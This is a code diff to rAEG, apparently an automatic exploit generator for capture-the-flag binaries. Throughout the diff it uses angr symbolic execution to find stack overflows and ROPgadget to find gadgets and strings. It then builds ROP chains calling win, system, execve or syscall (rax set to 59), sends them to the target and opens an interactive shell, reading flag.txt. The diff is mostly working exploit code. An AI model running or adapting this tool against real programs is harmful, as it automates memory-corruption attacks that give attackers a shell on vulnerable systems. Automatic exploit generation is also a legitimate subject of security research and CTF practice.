@@ -37,28 +37,15 @@ class rAEG:
         self.rop_calls = []
         self.exploit_function = None
 
+        self.rop_chain = None
         self.string_address = None
 
-        self.got_overwrite_address = None
-        self.format_write = None
+        self.format_write_address = None
 
         self.canary = None
         self.canary_leak = None
 
-        # Create angr project
-        self.proj = angr.Project(binary_path, load_options={"auto_load_libs":False})
-        start_addr = self.elf.sym["main"]
-        # Maybe change to symbolic file stream
-        buff_size = 600
-        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
-        self.symbolic_padding = None
-
-        self.state = self.proj.factory.blank_state(
-                addr=start_addr,
-                stdin=self.symbolic_input
-        )
-        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
-        self.simgr.stashes["mem_corrupt"] = []
+        self.flag = None
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
@@ -82,6 +69,25 @@ class rAEG:
 
     # Use angr to explore with the check_mem_corruption function
     def stack_smash(self):
+        # Create angr project
+        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
+        start_addr = self.elf.sym["main"]
+        # Maybe change to symbolic file stream
+        buff_size = 600
+        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
+        self.symbolic_padding = None
+
+        self.state = self.proj.factory.blank_state(
+                addr=start_addr,
+                stdin=self.symbolic_input
+        )
+        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
+        self.simgr.stashes["mem_corrupt"] = []
+
+
+        #self.proj.hook_symbol()
+
+
         log.info("Attempting to smash the stack")
         self.simgr.explore(step_func=self.check_mem_corruption)
 
@@ -125,36 +131,40 @@ class rAEG:
             output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
             string_output = output.split(b"\n")[2].split(b" ")
             if len(string_output) > 1:
-                self.string_address = string_output[0]
-                log.info(f"Found string {s} at {self.string_address}")
+                self.string_address = p64(int(string_output[0],16))
+                log.info(f"Found string {s} at {hex(u64(self.string_address))}")
                 break
 
         if self.string_address == None:
             log.warning("Couldn't find any useful strings")
 
-        # Find functions to use for exploit by enumerating through exploit functions
-        for func in self.elf.sym:
-            if func == "win":
+        params = []
+        # Find functions to use for exploit by enumerating through one win exploit functions
+        for symb in self.elf.sym:
+            if symb == "win":
                 # Either ret2win, rop parameters, or format got overwrite
-                self.exploit_function = self.elf.sym["win"]
+                self.exploit_function = "win"
+                log.info("Found win function")
                 break
-            elif func == "system":
-                self.exploit_function = self.elf.sym["system"]
+            elif symb == "system":
+                self.exploit_function = "system"
+                log.info("Found system function")
+                params = [self.string_address, p64(0)]
                 break
-            elif func == "execve":
-                self.exploit_function = self.elf.sym["execve"]
+            elif symb == "execve":
+                self.exploit_function = "execve"
+                params = [self.string_address, p64(0), p64(0)]
+                log.info("Found execve function")
                 break
-            elif func == "syscall":
-                self.exploit_function = self.elf.sym["syscall"]
-                params = [self.string_address, ]
+            elif symb == "syscall":
+                self.exploit_function = "syscall"
+                log.info("Found syscall function")
+                params = [self.string_address, p64(0), p64(0)]
                 break
 
         # Set functions and parameters as a dictionary set
 
-
-
-
-        self.parameters = None
+        self.parameters = params
 
 
         return None
@@ -183,7 +193,7 @@ class rAEG:
                 min_gadget = gadget
 
         logging.info(f"Found gadget for {register}: {min_gadget}")
-        return None
+        return min_gadget
 
 
 
@@ -231,7 +241,7 @@ class rAEG:
                min_gadget =  gadget
 
         log.info(f"Found write primitive gadget: {min_gadget}")
-        return None
+        return min_gadget
 
     # Find writable address in binary
     def find_writable_address(self):
@@ -249,21 +259,32 @@ class rAEG:
         chain = b""
         # If it is a syscall add pop rax, 59 for execve
         if function == "syscall":
-            pop_rax = find_reg_gadget("rax")
-            pops = pop_rax.count("pop")
+            pop_rax_string= self.find_reg_gadget("rax")
+            pops = pop_rax_string.count(b"pop")
+            pop_rax = pop_rax_string.split(b":")[0].strip()
 
-            #if pops > 1:
+            chain += pop_rax + p64(59)
+            while pops > 1:
+                chain += p64(0)
+                pops -= 1
 
             print(pop_rax)
-            print(pops)
             # Get pop rax gadget or another gadget to control rax
             #break
-        for i in range(len(parameters)):
-            pop_reg = find_reg_gadget(regs[i])
-            pops = pop_reg.count("pop")
-            print(pop_reg)
-            print(pops)
+        if len(parameters) > 0:
+            for i in range(len(parameters)):
+                pop_reg_string = self.find_reg_gadget(arg_regs[i])
+                pops = pop_reg_string.count(b"pop")
+                pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
+                chain += pop_reg + parameters[i]
+                while pops > 1:
+                    chain += p64(0)
+                    pops -= 1
+                    print(pop_reg)
+                    print(pops)
+
         chain += p64(self.elf.sym[function])
+        print(chain)
 
         return chain
 
@@ -273,7 +294,9 @@ class rAEG:
         if self.string_address == None:
             #Perform a string write
             #
-            write_gadget = find_write_gadget()
+            write_gadget = self.find_write_gadget()
+        else:
+            self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)
 
         return None
 
@@ -306,9 +329,14 @@ class rAEG:
             # If there is a leak given then parse the leak
             #
             #chain = self.generate_rop_chain_call()
-            main = p64(self.elf.sym["main"])
-            fini = p64(self.elf.sym["_fini"])
-            p.sendline(self.symbolic_padding + fini +  main)
+            if self.rop_chain != None:
+                log.info("Sending ROP Chain")
+                p.sendline(self.symbolic_padding + self.rop_chain)
+                p.sendline(b"cat flag.txt")
+            else:
+                main = p64(self.elf.sym["main"])
+                fini = p64(self.elf.sym["_fini"])
+                p.sendline(self.symbolic_padding + fini +  main)
             p.interactive()
         # Assume that its a format challenge either format write or format leak
         else:
@@ -330,5 +358,6 @@ if __name__ == "__main__":
 
     rage = rAEG(args.bin)
     rage.find_vulnerability()
+    rage.generate_rop_chain()
 
     rage.exploit()
